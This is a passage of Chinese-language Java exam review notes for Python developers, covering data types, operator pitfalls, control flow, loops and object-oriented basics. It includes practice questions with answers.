    <content type="html"><![CDATA[<hr><h3 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a><strong>第一章 绪论</strong></h3><h4 id="核心考点"><a href="#核心考点" class="headerlink" title="核心考点"></a><strong>核心考点</strong></h4><ol><li><p><strong>Java语言特点</strong>（单选题&#x2F;简答题）</p><ul><li><strong>跨平台性</strong>（JVM实现）：<code>.java</code> → 编译为 <code>.class</code>字节码 → JVM解释执行（对比Python的<code>.py</code>→PVM）</li><li><strong>面向对象</strong>：完全OOP（连<code>main</code>都必须在类中），Python支持多范式</li><li><strong>自动内存管理</strong>：垃圾回收器GC（类似Python，但Java需手动触发<code>System.gc()</code>建议回收）</li><li><strong>强类型</strong>：变量必须声明类型（Python是动态类型）</li></ul></li><li><p><strong>Java运行原理</strong>（填空题）</p><pre><code class=" mermaid">graph LRA[.java源码] --&gt; B[javac编译]B --&gt; C[.class字节码]C --&gt; D[JVM加载]D --&gt; E[解释执行/即时编译JIT]</code></pre></li></ol><hr><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h3 id="Java运行原理（外卖平台类比）"><a href="#Java运行原理（外卖平台类比）" class="headerlink" title="Java运行原理（外卖平台类比）"></a><strong>Java运行原理（外卖平台类比）</strong></h3><ol><li><strong>您写代码</strong> &#x3D; 在美团后台创建新功能（<code>.java</code>文件）</li><li><strong>javac编译</strong> &#x3D; 美团技术团队打包成APP安装包（生成<code>.class</code>）</li><li><strong>JVM运行</strong> &#x3D; 用户手机安装美团APP（不同手机&#x3D;不同操作系统）</li><li><strong>跨平台</strong> &#x3D; 同一安装包在华为&#x2F;小米&#x2F;iPhone都能运行</li></ol><p>“Java要求所有代码必须包含在类中（包括main入口函数），通过创建对象来操作数据和方法。这符合面向对象的封装性（数据与操作绑定在类内）、继承性（extends实现代码复用）、多态性（父类引用指向子类对象）三大特征”</p><h3 id="第二章-Java语言基础"><a href="#第二章-Java语言基础" class="headerlink" title="第二章 Java语言基础"></a><strong>第二章 Java语言基础</strong></h3><h4 id="1-标识符规则（判断题）"><a href="#1-标识符规则（判断题）" class="headerlink" title="1. 标识符规则（判断题）"></a><strong>1. 标识符规则</strong>（判断题）</h4><ul><li>首字符：字母&#x2F;<code>_</code>&#x2F;<code>$</code>（<strong>不能数字开头</strong>，同Python）</li><li>区分大小写（<code>age</code>≠<code>Age</code>）</li><li><strong>禁止关键字</strong>（<code>int</code>, <code>class</code>等48个保留字）<blockquote><p>✅合法：<code>_name</code>, <code>$value</code><br>❌非法：<code>1var</code>（数字开头）, <code>public</code>（关键字）</p></blockquote></li></ul><h4 id="2-数据类型（填空题）"><a href="#2-数据类型（填空题）" class="headerlink" title="2. 数据类型（填空题）"></a><strong>2. 数据类型</strong>（填空题）</h4><table><thead><tr><th>类型</th><th>位数</th><th>范围</th><th>Java示例</th><th>Python对比</th></tr></thead><tbody><tr><td><code>byte</code></td><td>8</td><td>-128~127</td><td><code>byte b = 10;</code></td><td><code>int</code>自动处理</td></tr><tr><td><code>int</code></td><td>32</td><td>≈±21亿</td><td><code>int i = 100;</code></td><td><code>int</code>无位数限制</td></tr><tr><td><code>double</code></td><td>64</td><td>IEEE 754浮点</td><td><code>double d=3.14;</code></td><td><code>float</code></td></tr><tr><td><code>char</code></td><td>16</td><td>Unicode字符</td><td><code>char c=&#39;A&#39;;</code></td><td><code>str</code>单字符</td></tr><tr><td><code>boolean</code></td><td>-</td><td><code>true</code>&#x2F;<code>false</code></td><td><code>boolean flag=true;</code></td><td><code>bool</code></td></tr></tbody></table><p><strong>引用类型</strong>：类&#x2F;数组&#x2F;接口（类似Python的类实例、list）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;  <span class="hljs-comment">// 引用类型声明</span><br><span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>]; <span class="hljs-comment">// 数组声明（固定长度）</span><br></code></pre></td></tr></table></figure><h4 id="3-运算符（程序填空）"><a href="#3-运算符（程序填空）" class="headerlink" title="3. 运算符（程序填空）"></a><strong>3. 运算符</strong>（程序填空）</h4><table><thead><tr><th>类型</th><th>运算符</th><th>特殊点</th></tr></thead><tbody><tr><td>算术</td><td><code>+ - * / %</code></td><td><code>10/3=3</code>（整数除）</td></tr><tr><td>关系</td><td><code>== != &gt; &lt;</code></td><td><strong><code>==</code>比较引用地址</strong>（字符串用<code>.equals()</code>）</td></tr><tr><td>逻辑</td><td>&#96;&amp;&amp;</td><td></td></tr><tr><td>赋值</td><td><code>= += -=</code></td><td><code>x += 5</code> 等价 <code>x = x+5</code></td></tr></tbody></table><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="Java运算符考试详解（针对Python开发者）"><a href="#Java运算符考试详解（针对Python开发者）" class="headerlink" title="Java运算符考试详解（针对Python开发者）"></a><em>Java运算符考试详解（针对Python开发者）</em></h1><p><em>下面我将详细讲解Java运算符在考试中的具体考法，结合真题和Python对比，帮助您彻底掌握这些考点：</em></p><h2 id="一、算术运算符：整数除法的”陷阱题”"><a href="#一、算术运算符：整数除法的”陷阱题”" class="headerlink" title="一、算术运算符：整数除法的”陷阱题”"></a><em>一、算术运算符：整数除法的”陷阱题”</em></h2><h3 id="考试常见题型"><a href="#考试常见题型" class="headerlink" title="考试常见题型"></a><em>考试常见题型</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：程序填空</span><br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-type">double</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a / b; <span class="hljs-comment">// 空1：c = ______ (3.0)</span><br><span class="hljs-type">double</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>)a / b; <span class="hljs-comment">// 空2：d = ______ (3.333...)</span><br><br><span class="hljs-comment">// 题型2：判断题</span><br><span class="hljs-comment">// &quot;Java中5/2的结果是2.5&quot; → False（正确答案是2）</span><br></code></pre></td></tr></table></figure><h3 id="核心考点解析"><a href="#核心考点解析" class="headerlink" title="核心考点解析"></a><em>核心考点解析</em></h3><ol><li><p><em><strong>整数除法截断</strong>：</em></p><ul><li><em>Java：<code>10/3 = 3</code>（直接舍弃小数部分）</em></li><li><em>Python：<code>10/3 = 3.333...</code>（自动转为浮点除）</em></li></ul></li><li><p><em><strong>类型提升规则</strong>：</em></p><pre><code class=" mermaid">graph LRA[int/int] --&gt; B[int]C[double/int] --&gt; D[double]D --&gt; E[保留小数]</code></pre></li></ol><h3 id="避坑技巧"><a href="#避坑技巧" class="headerlink" title="避坑技巧"></a><em>避坑技巧</em></h3><ul><li><em>看到除法先看操作数类型</em></li><li><em>需要小数结果时，将被除数强转为<code>double</code></em></li><li><em>取模运算<code>%</code>的行为与Python相同</em></li></ul><h2 id="二、关系运算符：字符串比较的”死亡陷阱”"><a href="#二、关系运算符：字符串比较的”死亡陷阱”" class="headerlink" title="二、关系运算符：字符串比较的”死亡陷阱”"></a><em>二、关系运算符：字符串比较的”死亡陷阱”</em></h2><h3 id="考试高频题"><a href="#考试高频题" class="headerlink" title="考试高频题"></a><em>考试高频题</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：程序输出判断</span><br><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br><br>System.out.println(s1 == s2); <span class="hljs-comment">// 空1：输出______ (false)</span><br>System.out.println(s1.equals(s2)); <span class="hljs-comment">// 空2：输出______ (true)</span><br><br><span class="hljs-comment">// 题型2：找错题</span><br><span class="hljs-comment">// 找出下面代码的错误：</span><br><span class="hljs-keyword">if</span> (nameInput == <span class="hljs-string">&quot;admin&quot;</span>) &#123; <span class="hljs-comment">// 应该用equals</span><br>    grantAccess();<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th><em>比较方式</em></th><th><em>Java</em></th><th><em>Python</em></th></tr></thead><tbody><tr><td><em>值比较</em></td><td><em><code>.equals()</code></em></td><td><em><code>==</code></em></td></tr><tr><td><em>引用比较</em></td><td><em><code>==</code></em></td><td><em><code>is</code></em></td></tr></tbody></table><blockquote><p><em>💡 考试口诀：<strong>Java字符串，equals保平安</strong></em></p></blockquote><h2 id="三、逻辑运算符：短路规则的”隐蔽考点”"><a href="#三、逻辑运算符：短路规则的”隐蔽考点”" class="headerlink" title="三、逻辑运算符：短路规则的”隐蔽考点”"></a><em>三、逻辑运算符：短路规则的”隐蔽考点”</em></h2><h3 id="典型考题"><a href="#典型考题" class="headerlink" title="典型考题"></a><em>典型考题</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：程序填空</span><br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> (x &gt; <span class="hljs-number">10</span>) &amp;&amp; (++x &gt; <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 空1：x的值是？______ (5)</span><br><br><span class="hljs-type">boolean</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> (x &lt; <span class="hljs-number">10</span>) || (++x &gt; <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 空2：x的值是？______ (5)</span><br><br><span class="hljs-comment">// 题型2：输出结果分析</span><br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (a &gt; <span class="hljs-number">4</span> || a++ &lt; <span class="hljs-number">10</span>) &#123;<br>    System.out.println(a); <span class="hljs-comment">// 输出？______ (5)</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="短路规则详解"><a href="#短路规则详解" class="headerlink" title="短路规则详解"></a><em>短路规则详解</em></h3><table><thead><tr><th><em>表达式</em></th><th><em>执行情况</em></th><th><em>解释</em></th></tr></thead><tbody><tr><td><em><code>false &amp;&amp; ...</code></em></td><td><em>跳过右边</em></td><td><em>一假即假</em></td></tr><tr><td>*&#96;true</td><td></td><td>…&#96;*</td></tr><tr><td><em><code>true &amp;&amp; ...</code></em></td><td><em>执行右边</em></td><td><em>需验证</em></td></tr><tr><td>*&#96;false</td><td></td><td>…&#96;*</td></tr></tbody></table><h2 id="四、赋值运算符：类型转换的”暗坑”"><a href="#四、赋值运算符：类型转换的”暗坑”" class="headerlink" title="四、赋值运算符：类型转换的”暗坑”"></a><em>四、赋值运算符：类型转换的”暗坑”</em></h2><h3 id="经典考题"><a href="#经典考题" class="headerlink" title="经典考题"></a><em>经典考题</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：编译错误判断</span><br><span class="hljs-type">byte</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>num = num + <span class="hljs-number">5</span>;   <span class="hljs-comment">// 空1：是否编译错误？______ (是)</span><br>num += <span class="hljs-number">5</span>;        <span class="hljs-comment">// 空2：是否编译错误？______ (否)</span><br><br><span class="hljs-comment">// 题型2：结果计算</span><br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br>x += <span class="hljs-number">3</span> * <span class="hljs-number">2</span>;      <span class="hljs-comment">// 空3：x = ______ (11)</span><br></code></pre></td></tr></table></figure><h3 id="类型转换规则"><a href="#类型转换规则" class="headerlink" title="类型转换规则"></a><em>类型转换规则</em></h3><pre><code class=" mermaid">graph LR    A[byte + int] --&gt; B[int]    C[直接赋值给byte] --&gt; D[需要强制转换]    E[复合赋值] --&gt; F[自动转换]</code></pre><h3 id="复合赋值等价公式"><a href="#复合赋值等价公式" class="headerlink" title="复合赋值等价公式"></a><em>复合赋值等价公式</em></h3><table><thead><tr><th><em>表达式</em></th><th><em>等价形式</em></th><th><em>特殊处理</em></th></tr></thead><tbody><tr><td><em><code>x += y</code></em></td><td><em><code>x = (T)(x + y)</code></em></td><td><em>自动类型转换</em></td></tr><tr><td><em><code>x = x + y</code></em></td><td><em>-</em></td><td><em>需要手动转换</em></td></tr></tbody></table><h2 id="五、综合考题分析"><a href="#五、综合考题分析" class="headerlink" title="五、综合考题分析"></a><em>五、综合考题分析</em></h2><h3 id="真题示例（程序填空）"><a href="#真题示例（程序填空）" class="headerlink" title="真题示例（程序填空）"></a><em>真题示例（程序填空）</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperatorTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 算术运算符</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span>, n = <span class="hljs-number">4</span>;<br>        <span class="hljs-type">double</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> m / n;          <span class="hljs-comment">// 空1：______ (1.0)</span><br>        <span class="hljs-type">double</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>)m / n;  <span class="hljs-comment">// 空2：______ (1.75)</span><br>        <br>        <span class="hljs-comment">// 关系运算符</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Java&quot;</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> s1.equals(s2); <span class="hljs-comment">// 空3：______ (false)</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> s1.equalsIgnoreCase(s2); <span class="hljs-comment">// 空4：______ (true)</span><br>        <br>        <span class="hljs-comment">// 逻辑运算符</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b3</span> <span class="hljs-operator">=</span> (x &gt; <span class="hljs-number">3</span>) &amp;&amp; (x++ &lt; <span class="hljs-number">10</span>); <span class="hljs-comment">// 空5：b3 = ______ (true)</span><br>        <span class="hljs-comment">// 空6：x = ______ (6)</span><br>        <br>        <span class="hljs-comment">// 赋值运算符</span><br>        <span class="hljs-type">byte</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        y += <span class="hljs-number">20</span>; <span class="hljs-comment">// 空7：y = ______ (30)</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="解题技巧"><a href="#解题技巧" class="headerlink" title="解题技巧"></a><em>解题技巧</em></h3><ol><li><em><strong>整数除法</strong>：先看操作数类型，整数除结果必为整数</em></li><li><em><strong>字符串比较</strong>：永远用equals，&#x3D;&#x3D;只用于基本类型</em></li><li><em><strong>短路规则</strong>：注意自增(++)在逻辑表达式中的执行情况</em></li><li><em><strong>复合赋值</strong>：注意自动类型转换特性</em></li></ol><h2 id="六、Python开发者特别注意事项"><a href="#六、Python开发者特别注意事项" class="headerlink" title="六、Python开发者特别注意事项"></a><em>六、Python开发者特别注意事项</em></h2><table><thead><tr><th><em>运算符</em></th><th><em>Java陷阱</em></th><th><em>Python行为</em></th><th><em>应对策略</em></th></tr></thead><tbody><tr><td><em><code>/</code></em></td><td><em>整数除截断</em></td><td><em>自动浮点除</em></td><td><em>强转为double</em></td></tr><tr><td><em><code>==</code></em></td><td><em>比较对象引用</em></td><td><em>比较值</em></td><td><em>字符串用equals</em></td></tr><tr><td><em><code>&amp;&amp;</code></em></td><td><em>短路规则</em></td><td><em>and同样短路</em></td><td><em>避免右边有副作用</em></td></tr><tr><td><em><code>+=</code></em></td><td><em>自动类型转换</em></td><td><em>无类型限制</em></td><td><em>注意byte&#x2F;short类型</em></td></tr><tr><td><em><code>++</code></em></td><td><em>前后缀区别大</em></td><td><em>无此运算符</em></td><td><em>避免在复杂表达式使用</em></td></tr></tbody></table><h2 id="七、考试答题口诀"><a href="#七、考试答题口诀" class="headerlink" title="七、考试答题口诀"></a><em>七、考试答题口诀</em></h2><blockquote><p><em>除法先看类型，整数结果截断<br></em><br><em>字符串比用equals，&#x3D;&#x3D;只判血缘<br></em><br><em>逻辑运算会短路，右边可能不算<br></em><br><em>复合赋值能强转，普通赋值瞪眼<br></em><br><em>自增前后要分清，考试专设此险</em></p></blockquote><p><em>掌握这些考点和技巧，运算符相关题目将不再是难题！考试时遇到运算符题目，先默念口诀再作答，能有效避免常见陷阱。</em></p><h4 id="4-控制语句（与Python对比）"><a href="#4-控制语句（与Python对比）" class="headerlink" title="4. 控制语句（与Python对比）"></a><strong>4. 控制语句</strong>（与Python对比）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// if-else（必须用括号）</span><br><span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">60</span>) &#123;<br>    System.out.println(<span class="hljs-string">&quot;及格&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;不及格&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// switch（支持int/char/String）</span><br><span class="hljs-keyword">switch</span>(grade) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;A&#x27;</span>: <br>        System.out.println(<span class="hljs-string">&quot;优秀&quot;</span>);<br>        <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 必须break，否则穿透！</span><br>    <span class="hljs-keyword">default</span>:<br>        System.out.println(<span class="hljs-string">&quot;未知&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-循环（重点！程序填空高频）"><a href="#5-循环（重点！程序填空高频）" class="headerlink" title="5. 循环（重点！程序填空高频）"></a><strong>5. 循环</strong>（重点！程序填空高频）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// for循环（固定次数）</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) &#123;  <span class="hljs-comment">// i只在循环内有效</span><br>    System.out.print(i);<br>&#125;<br><br><span class="hljs-comment">// while（条件循环）</span><br><span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (j&lt;<span class="hljs-number">5</span>) &#123;<br>    System.out.print(j);<br>    j++;<br>&#125;<br><br><span class="hljs-comment">// do-while（至少执行一次）</span><br><span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">do</span> &#123;<br>    System.out.print(k);<br>    k++;<br>&#125; <span class="hljs-keyword">while</span> (k&lt;<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><h4 id="6-break-continue（判断题）"><a href="#6-break-continue（判断题）" class="headerlink" title="6. break&#x2F;continue（判断题）"></a><strong>6. break&#x2F;continue</strong>（判断题）</h4><ul><li><code>break</code>：跳出<strong>整个循环</strong>（同Python）</li><li><code>continue</code>：跳过<strong>本次循环</strong>剩余代码（同Python）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>;     <span class="hljs-comment">// 结束循环（i=5时退出）</span><br>    <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// 跳过偶数</span><br>    System.out.print(i);  <span class="hljs-comment">// 输出：1 3</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="第三章-面向对象（核心！）"><a href="#第三章-面向对象（核心！）" class="headerlink" title="第三章 面向对象（核心！）"></a><strong>第三章 面向对象（核心！）</strong></h3><p><img src="/%5Cimages%5Cjava.png"></p><h4 id="1-基本概念（简答题）"><a href="#1-基本概念（简答题）" class="headerlink" title="1. 基本概念（简答题）"></a><strong>1. 基本概念</strong>（简答题）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> &#123;                 <span class="hljs-comment">// 类定义（类似Python class）</span><br>    String name;            <span class="hljs-comment">// 成员变量（属性）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String n)</span> &#123;  <span class="hljs-comment">// 构造方法（__init__）</span><br>        <span class="hljs-built_in">this</span>.name = n;      <span class="hljs-comment">// this指当前对象</span><br>    &#125;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">bark</span><span class="hljs-params">()</span> &#123;           <span class="hljs-comment">// 成员方法</span><br>        System.out.println(name + <span class="hljs-string">&quot;汪汪！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 创建对象</span><br><span class="hljs-type">Dog</span> <span class="hljs-variable">myDog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;Buddy&quot;</span>);  <span class="hljs-comment">// new实例化（Python直接Dog()）</span><br>myDog.bark();  <span class="hljs-comment">// 调用方法</span><br></code></pre></td></tr></table></figure><h4 id="2-三大特性"><a href="#2-三大特性" class="headerlink" title="2. 三大特性"></a><strong>2. 三大特性</strong></h4><table><thead><tr><th>特性</th><th>Java实现</th><th>Python对比</th></tr></thead><tbody><tr><td><strong>封装</strong></td><td><code>private</code>&#x2F;<code>protected</code>&#x2F;<code>public</code></td><td>命名约定（_name）</td></tr><tr><td><strong>继承</strong></td><td><code>extends</code>（单继承）</td><td>多继承（MRO）</td></tr><tr><td><strong>多态</strong></td><td>父类引用指向子类对象 + 方法重写</td><td>Duck Typing</td></tr></tbody></table><p><strong>继承示例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123; <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123; System.out.println(<span class="hljs-string">&quot;Eating...&quot;</span>); &#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;  <span class="hljs-comment">// 继承</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">// 方法重写（多态基础）</span><br>        System.out.println(<span class="hljs-string">&quot;Cat eats fish&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 多态应用</span><br><span class="hljs-type">Animal</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();  <span class="hljs-comment">// 父类引用指向子类对象</span><br>a.eat();  <span class="hljs-comment">// 输出&quot;Cat eats fish&quot;（动态绑定）</span><br></code></pre></td></tr></table></figure><h4 id="3-访问控制（单选题）"><a href="#3-访问控制（单选题）" class="headerlink" title="3. 访问控制（单选题）"></a><strong>3. 访问控制</strong>（单选题）</h4><table><thead><tr><th>修饰符</th><th>类内</th><th>同包</th><th>子类</th><th>其他包</th></tr></thead><tbody><tr><td><code>private</code></td><td>✅</td><td>❌</td><td>❌</td><td>❌</td></tr><tr><td><code>protected</code></td><td>✅</td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><code>public</code></td><td>✅</td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table><hr><h3 id="第四章-高级特性（重点！）"><a href="#第四章-高级特性（重点！）" class="headerlink" title="第四章 高级特性（重点！）"></a><strong>第四章 高级特性（重点！）</strong></h3><p>只有static和final可组合在一起，而abstract和static一般不能组<br>合在一起。</p><p>• 接口与类的共同点：均可以实现类的继承。<br>• 接口与类的不同点：<br>（1）一个接口可由一个类或多个类来实现，一个类也可以实现<br>多个接口，从而具备多重继承的特性。但是一个类只能有一个直<br>接父类，没有多重继承的特性。<br>（2）接口中的所有方法均没有方法体，只有成员方法名，而类<br>要实现接口的话，必须实现接口里面的所有成员方法。<br>（3）一个类可以直接继承其父类的成员方法，不需要去实现方<br>法，也可以重载或者重写其父类的成员方法。</p><h4 id="1-关键字"><a href="#1-关键字" class="headerlink" title="1. 关键字"></a><strong>1. 关键字</strong></h4><table><thead><tr><th>关键字</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td><code>abstract</code></td><td>抽象类&#x2F;方法（不能实例化）</td><td><code>abstract void draw();</code></td></tr><tr><td><code>static</code></td><td>类级别共享</td><td><code>static int count=0;</code></td></tr><tr><td><code>final</code></td><td>常量&#x2F;不可继承</td><td><code>final double PI=3.14;</code></td></tr><tr><td><code>this</code></td><td>当前对象引用</td><td><code>this.name = name;</code></td></tr></tbody></table><h4 id="2-接口-vs-抽象类（简答题）"><a href="#2-接口-vs-抽象类（简答题）" class="headerlink" title="2. 接口 vs 抽象类（简答题）"></a><strong>2. 接口 vs 抽象类</strong>（简答题）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Flyable</span> &#123;          <span class="hljs-comment">// 接口（100%抽象）</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title 